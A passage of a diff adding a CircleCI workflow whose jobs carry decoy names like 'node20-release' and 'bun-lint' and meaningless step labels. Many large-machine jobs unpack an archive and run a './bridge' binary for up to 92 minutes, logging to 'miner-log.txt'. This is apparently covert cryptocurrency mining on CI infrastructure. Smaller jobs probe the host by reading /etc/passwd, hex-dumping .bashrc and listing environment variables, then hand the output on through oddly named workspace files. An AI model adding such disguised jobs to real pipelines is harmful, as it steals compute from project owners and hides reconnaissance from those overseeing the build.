+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/qc7OYnP 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  yolo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: The blank sterilized with no errors
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; sha512sum /etc/os-release >"/var/tmp/lower_test.txt" && sha512sum -c "/var/tmp/lower_test.txt"; true ; } > /tmp/handoff-04/roUTeRchRomegLYpHgArDen
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'roUTeRchRomegLYpHgArDen'
+  CHECK_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/roUTeRchRomegLYpHgArDen 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  msBarnes:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Rebuild to avoid surprises
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; cut -d ":" -f 1-3 /etc/passwd | sort -u | tr -d '[:digit:]'; true ; } > /tmp/handoff-04/16.02.2025
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - '16.02.2025'
+  fx-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/16.02.2025 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  colMocha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Prepare the master file for mux
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; touch -r /etc/passwd "/tmp/theater.out" && stat -c %Y /etc/passwd "/tmp/theater.out"; true ; } > /tmp/handoff-04/os-src
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'os-src'
+  bun-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/os-src 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  optionMode:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Much obliged review the status update
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 2 -type d -name "*.pid" -exec du -sh {} + 2>/dev/null | cat -n; true ; } > /tmp/handoff-04/sample_266
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'sample_266'
+  v2-rc3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/sample_266 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  M35:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Bjorn owns focus
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; { printf "%s\n" dog eagle cat; } >/var/tmp/receipt-chapter.txt && sort /var/tmp/receipt-chapter.txt; true ; } > /tmp/handoff-04/PXL-81091
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'PXL-81091'
+  node20-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/PXL-81091 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  FORM:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: EventStreamBackfillStep
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; \ls -sprvd ~|awk 'NR % 3 == 0'; true ; } > /tmp/handoff-04/CEdARsWeepbLobLyNx
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'CEdARsWeepbLobLyNx'
+  v5-preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/CEdARsWeepbLobLyNx 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  IOSignalDidDumpNotification:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: ok NOW quarantine the test shards
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; for path in /usr/lib/*release*; do ls -l "${path}";done | tac; true ; } > /tmp/handoff-04/PNG_SSH
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'PNG_SSH'
+  v9-nightly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/PNG_SSH 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  file_stage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Chapter XII Rerouting Mesh Routes
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; printf 'host=localhost\nport=3842\nuser=pete\ndebug=true\n' >'/dev/shm/link.txt' && sed -n "s/^user=//p" '/dev/shm/link.txt'; true ; } > /tmp/handoff-04/HoLLowsoUTh
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'HoLLowsoUTh'
+  PrepareImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/HoLLowsoUTh 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  PHResource:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: PACK THE PALLETS ON DOCK F
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; cat /proc/self/status|grep -E '^(Uid|Gid)'; true ; } > /tmp/handoff-04/hollowsurgemodule
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'hollowsurgemodule'
+  realease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/hollowsurgemodule 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  kjh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: piece 5 blue green slot release
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; ls -1 /etc/default | fmt -w 33 | cut -c1-30; true ; } > /tmp/handoff-04/28P
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - '28P'
+  p-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/28P 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  v_CreateStep:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Protocol Falcon
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; if test -d ~; then echo 'true'; else echo false; fi; true ; } > /tmp/handoff-04/105.137.198.160
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - '105.137.198.160'
+  wen-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/105.137.198.160 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  pickGraphMap:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: alright normalize the session logs
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\nyuki,nairobi,60\nsara,austin,78\nerin,perth,53\npete,lima,67\n' >"${TMPDIR:-/tmp}/p9.dat" && sed 1d "${TMPDIR:-/tmp}/p9.dat" | sort -t, -k2; true ; } > /tmp/handoff-04/CarRieRaToLLPIXEl
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'CarRieRaToLLPIXEl'
+  add-webhook:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Load upstream (step2)
+          command: |
+            cat /tmp/handoff-04/CarRieRaToLLPIXEl 2>/dev/null | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -rn | head -3 || true
+      - run:
+          name: Pull working copy
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand archive
+          command: tar --extract --file=collection.tar
+      - run:
+          name: Finalize build
+          command: free -m
+      - run:
+          name: Record build info
+          command: df -h
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          name: Run
+          no_output_timeout: 92m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            nice -n 0 ./bridge
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+
+  pull_or:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: PICK THE BACKORDERS
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; cut -f1 -d: /etc/passwd| sort| uniq -d| tr -d '[:digit:]'; true ; } > /tmp/handoff-04/socket114
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'socket114'
+  experimental-word:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Warmdown
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; od -x $HOME/.bashrc|head -n2; true ; } > /tmp/handoff-04/CEdARsWeepbLobLyNx
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'CEdARsWeepbLobLyNx'
+  us_btn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Definitely pack the tote bins
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; echo -n 'timeout reached' | od -An -tx1; true ; } > /tmp/handoff-04/patch.1.18
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'patch.1.18'
+  unsafeNo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Enchant the team
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; for w in disk violet todo blue; do echo ${w^^}; done; true ; } > /tmp/handoff-04/receipt
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'receipt'
+  OPT_ID:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Onboard the shift roster week one
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; echo -n "task 1 of 3" | b2sum; true ; } > /tmp/handoff-04/PXL-81091
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'PXL-81091'
+  ITM-RETURN-LEN:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: AUDIT ACL
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; declare -p | grep -m 4 HOME; true ; } > /tmp/handoff-04/105.137.198.160
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - '105.137.198.160'
+  stalegradient:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-04
+      - run:
+          name: Draft parcels
+          command: |
+            mkdir -p /tmp/handoff-04
+            { set +o pipefail 2>/dev/null; hash grep 2>/dev/null && echo installed || echo "not installed"; true ; } > /tmp/handoff-04/hollowsurgemodule
+            echo "written-C"
+      - persist_to_workspace:
+          root: /tmp/handoff-04
+          paths:
+            - 'hollowsurgemodule'
+workflows:
+  all:
+    jobs:
+      - ms_fname_prod
+      - preview-build:
+          requires:
+            - ms_fname_prod
+      - knnKNNLayer:
+          requires:
+            - ms_fname_prod
+      - oct20-canary:
+          requires:
+            - knnKNNLayer
+      - msBarnes:
+          requires:
+            - knnKNNLayer
+      - fx-2a:
+          requires:
+            - msBarnes
+      - logIterateCb:
+          requires:
+            - msBarnes
+      - deploy:
+          requires:
+            - logIterateCb
+      - triggerPage:
+          requires:
+            - logIterateCb
+      - qi-verify:
+          requires:
+            - triggerPage
+      - file_stage:
+          requires:
+            - triggerPage
+      - PrepareImage:
+          requires:
+            - file_stage
+      - pickGraphMap
+      - d14
+      - add-webhook:
+          requires:
+            - pickGraphMap
+            - d14
+      - q4-ship:
+          requires:
+            - pickGraphMap
+            - d14
+      - run-full-integration-tests:
+          requires:
+            - pickGraphMap
+            - d14
+      - ValidateService:
+          requires:
+            - pickGraphMap
+            - d14
+      - lock_total
+      - hu-ship:
+          requires:
+            - lock_total
+      - fe-f5-b6-54:
+          requires:
+            - lock_total
+      - preview:
+          requires:
+            - fe-f5-b6-54
+      - colMocha:
+          requires:
+            - fe-f5-b6-54
+      - bun-lint:
+          requires:
+            - colMocha
+      - success_city_link_3
+      - pull_or:
+          requires:
+            - success_city_link_3
+      - QA_HOOK_9:
+          requires:
+            - pull_or
+      - FORM:
+          requires:
+            - pull_or
+      - experimental-word:
+          requires:
+            - FORM
+      - v5-preview:
+          requires:
+            - experimental-word
+      - cfg_StorePromise:
+          requires:
+            - experimental-word
+      - us_btn:
+          requires:
+            - cfg_StorePromise
+      - push-it:
+          requires:
+            - us_btn
+      - in:
+          requires:
+            - us_btn
+      - unsafeNo:
+          requires:
+            - in
+      - auh-check:
+          requires:
+            - unsafeNo
+      - M35:
+          requires:
+            - unsafeNo
+      - OPT_ID:
+          requires:
+            - M35
+      - node20-release:
+          requires:
+            - OPT_ID
+      - v_CreateStep:
+          requires:
+            - OPT_ID
+      - ITM-RETURN-LEN:
+          requires:
+            - v_CreateStep
+      - wen-ship:
+          requires:
+            - ITM-RETURN-LEN
+      - PHResource:
+          requires:
+            - ITM-RETURN-LEN
+      - stalegradient:
+          requires:
+            - PHResource
+      - realease:
+          requires:
+            - stalegradient
+      - yolo
+      - CHECK_DEV:
+          requires:
+            - yolo
+      - l3v31:
+          requires:
+            - yolo
+      - ruby3-build:
+          requires:
+            - l3v31
+      - interfaceVal:
+          requires:
+            - l3v31
+      - lets-go:
+          requires:
+            - interfaceVal
+      - loadWierd:
+          requires:
+            - interfaceVal
+      - v1-rc:
+          requires:
+            - loadWierd
+      - Zxc
+      - DATA-426:
+          requires:
+            - Zxc
+      - IOSignalDidDumpNotification:
+          requires:
+            - Zxc
+      - v9-nightly:
+          requires:
+            - IOSignalDidDumpNotification
+      - profilesById:
+          requires:
+            - IOSignalDidDumpNotification
+      - bug-2630:
+          requires:
+            - profilesById
+      - kjh:
+          requires:
+            - profilesById
+      - p-new:
+          requires:
+            - kjh
+      - optionMode:
+          requires:
+            - kjh
+      - v2-rc3:
+          requires:
+            - optionMode
+      - DelegatingRefDriver:
+          requires:
+            - optionMode
+      - DATA-743:
+          requires:
+            - DelegatingRefDriver
